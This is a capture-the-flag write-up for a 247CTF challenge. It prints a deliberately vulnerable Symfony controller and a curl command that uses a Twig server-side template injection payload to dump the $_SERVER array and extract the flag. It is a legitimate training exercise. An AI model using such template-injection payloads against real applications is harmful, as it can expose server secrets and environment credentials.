# THE TWIG INJECTOR [MODERATE]

## Description

> Can you abuse the Twig injector service to gain access to the flag hidden in the $_SERVER array?

## Short Solution Description / Tags

Twig SSTI

## Solution

<details><summary>Click here for source code in text format</summary>

```php
<?php

namespace App\Controller;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class ChallengeController extends AbstractController
{

    /**
     * @Route("/inject")
     */
    public function inject(Request $request)
    {
        $inject = preg_replace('/[^{\.}a-z\|\_]/', '', $request->query->get('inject'));
        $response = new Response($this->get('twig')->createTemplate("Welcome to the twig injector!\n${inject}")->render());
        $response->headers->set('Content-Type', 'text/plain');
        return $response;
    }

    /**
     * @Route("/")
     */
    public function index()
    {
        return new Response(highlight_file(__FILE__, true));
    }
}
```

</details>

Twig SSTI.

```console
$ curl -G -s https://ab14bbd920c26145.247ctf.com/inject --data-urlencode 'inject={{app.request.server.all|join(',')}}' | grep -oiE '247ctf{.*?}'
247CTF{[REDACTED]}
```

## References

- [Server Side Template Injection - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#twig)
